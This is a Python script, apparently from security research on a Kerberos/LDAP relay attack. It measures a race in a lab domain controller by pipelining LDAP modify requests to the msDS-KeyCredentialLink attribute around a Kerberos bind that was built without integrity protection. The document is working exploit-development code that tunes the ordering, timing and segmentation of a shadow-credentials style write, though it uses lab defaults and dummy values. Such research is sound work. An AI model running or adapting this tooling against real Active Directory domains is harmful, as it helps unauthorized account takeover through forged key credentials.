#!/usr/bin/env python3
"""Controlled LDAP bind/write race probe against the lab DC.

Replicates the relay's pipelined write-before-bind race as an ordinary Kerberos
client, so ordering can be tested directly with full control over padding,
ordering, and TCP segmentation. The Kerberos context is built WITHOUT the
integrity flag, so a write processed after the bind returns result=50
(insufficientAccessRights) rather than triggering a signing reset. That gives a
clean two-way signal:

  modify result=1  -> processed before the bind committed (race lost)
  modify result!=1 -> processed after the bind committed (race won)

Creds and target come from the environment so nothing is written to disk:
  KRBUSER, KRBPASS, KRBDOMAIN (default mayyhem.com)
  DCIP (default 10.112.0.70), DCHOST (default dc.mayyhem.com)
  TARGET_DN (default CN=PS1-LAB,CN=Computers,DC=mayyhem,DC=com)

CLI: --count N  modify PDUs (shadowcred-style padding, default 2)
     --order mb|bm  modifies-then-bind (default) or bind-then-modifies
     --split-ms N   send the bind, wait N ms, then the modifies (separate segments)
     --repeat N     run the whole probe N times
"""
import argparse
import datetime
import os
import socket
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "relay"))
import relay_server as R

from impacket.krb5.gssapi import GSS_C_SEQUENCE_FLAG, GSS_C_REPLAY_FLAG
from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, CheckSumField
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from pyasn1.codec.der import encoder, decoder
from pyasn1.type.univ import noValue


def get_service_ticket(user, password, domain, kdc, spn):
    userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, _, sk = getKerberosTGT(userName, password, domain, "", "", "", kdc)
    serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
    tgs, cipher, _, sk = getKerberosTGS(serverName, domain, kdc, tgt, cipher, sk)
    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
    ticket = Ticket()
    ticket.from_asn1(tgs["ticket"])
    return userName, cipher, sk, ticket


def make_token(userName, cipher, sk, ticket, domain):
    blob = SPNEGO_NegTokenInit()
    blob["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]
    apReq = AP_REQ()
    apReq["pvno"] = 5
    apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    apReq["ap-options"] = constants.encodeFlags([])
    seq_set(apReq, "ticket", ticket.to_asn1)
    auth = Authenticator()
    auth["authenticator-vno"] = 5
    auth["crealm"] = domain
    seq_set(auth, "cname", userName.components_to_asn1)
    now = datetime.datetime.now(datetime.timezone.utc)
    auth["cusec"] = now.microsecond
    auth["ctime"] = KerberosTime.to_asn1(now)
    auth["cksum"] = noValue
    auth["cksum"]["cksumtype"] = 0x8003
    chk = CheckSumField()
    chk["Lgth"] = 16
    chk["Flags"] = GSS_C_SEQUENCE_FLAG | GSS_C_REPLAY_FLAG  # no INTEG, no CONF
    auth["cksum"]["checksum"] = chk.getData()
    auth["seq-number"] = 0
    enc = encoder.encode(auth)
    encx = cipher.encrypt(sk, 11, enc, None)
    apReq["authenticator"] = noValue
    apReq["authenticator"]["etype"] = cipher.enctype
    apReq["authenticator"]["cipher"] = encx
    blob["MechToken"] = encoder.encode(apReq)
    return blob.getData()


def modify_pdu(message_id, dn, attr, op, values):
    _tag, body = R.ldap_modify_changes_request(dn, [(attr, op, values)])
    return R.ber_tlv(0x30, R.ber_integer(message_id) + R.ber_tlv(0x66, body))


def ber_total_len(buf):
    """Return total byte length of the BER TLV at the start of buf, or None."""
    if len(buf) < 2:
        return None
    first = buf[1]
    if first < 0x80:
        return 2 + first
    nbytes = first & 0x7F
    if len(buf) < 2 + nbytes:
        return None
    length = int.from_bytes(buf[2:2 + nbytes], "big")
    return 2 + nbytes + length


def decode_result(msg):
    tag, message, _ = R.ber_element(msg, 0)
    tag, raw_id, off = R.ber_element(message, 0)
    mid = int.from_bytes(raw_id, "big")
    op_tag, op, _ = R.ber_element(message, off)
    rtag, rc, _ = R.ber_element(op, 0)
    result = rc[0] if rc else -1
    return mid, op_tag, result


def read_messages(sock, expected, timeout=20.0):
    sock.settimeout(timeout)
    buf = b""
    got = {}
    start = time.time()
    while len(got) < expected and time.time() - start < timeout:
        try:
            chunk = sock.recv(65535)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        while True:
            total = ber_total_len(buf)
            if total is None or len(buf) < total:
                break
            msg, buf = buf[:total], buf[total:]
            mid, op_tag, rc = decode_result(msg)
            got[mid] = (op_tag, rc, time.time() - start)
    return got


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--count", type=int, default=2)
    ap.add_argument("--order", choices=["mb", "bm"], default="mb")
    ap.add_argument("--split-ms", type=int, default=0)
    ap.add_argument("--repeat", type=int, default=1)
    args = ap.parse_args()

    user = os.environ["KRBUSER"]
    password = os.environ["KRBPASS"]
    domain = os.environ.get("KRBDOMAIN", "mayyhem.com")
    dcip = os.environ.get("DCIP", "10.112.0.70")
    dchost = os.environ.get("DCHOST", "dc.mayyhem.com")
    target_dn = os.environ.get("TARGET_DN", "CN=PS1-LAB,CN=Computers,DC=mayyhem,DC=com")
    spn = "ldap/%s" % dchost

    print(f"[*] getting no-integrity service ticket for {spn} as {domain}\\{user}")
    userName, cipher, sk, ticket = get_service_ticket(user, password, domain, dcip, spn)
    print(f"[*] got TGS; target_dn {target_dn}")
    print(f"[*] count={args.count} order={args.order} split_ms={args.split_ms} repeat={args.repeat}")

    for run in range(1, args.repeat + 1):
        modify_ids = list(range(1, args.count + 1))
        bind_id = args.count + 1
        token = make_token(userName, cipher, sk, ticket, domain)
        bind_bytes = R.ldap_sasl_bind(bind_id, token)
        dummy = b"\x00" * 8
        modifies = b"".join(
            modify_pdu(mid, target_dn, "msDS-KeyCredentialLink", 2, [dummy]) for mid in modify_ids
        )
        s = socket.create_connection((dcip, 389), timeout=15)
        if args.split_ms > 0:
            if args.order == "bm":
                s.sendall(bind_bytes)
                time.sleep(args.split_ms / 1000.0)
                s.sendall(modifies)
            else:
                s.sendall(modifies)
                time.sleep(args.split_ms / 1000.0)
                s.sendall(bind_bytes)
        else:
            s.sendall(bind_bytes + modifies if args.order == "bm" else modifies + bind_bytes)
        got = read_messages(s, expected=args.count + 1)
        s.close()

        bind_rc = got.get(bind_id, (None, None, None))[1]
        won = [mid for mid in modify_ids if got.get(mid, (None, 1))[1] not in (1, None)]
        codes = [got.get(mid, (None, None, None))[1] for mid in modify_ids]
        from collections import Counter
        summary = dict(Counter(codes))
        print(f"[run {run}] bind={bind_rc}  modify_result_codes={summary}  post_bind_wins={won}")


if __name__ == "__main__":
    main()
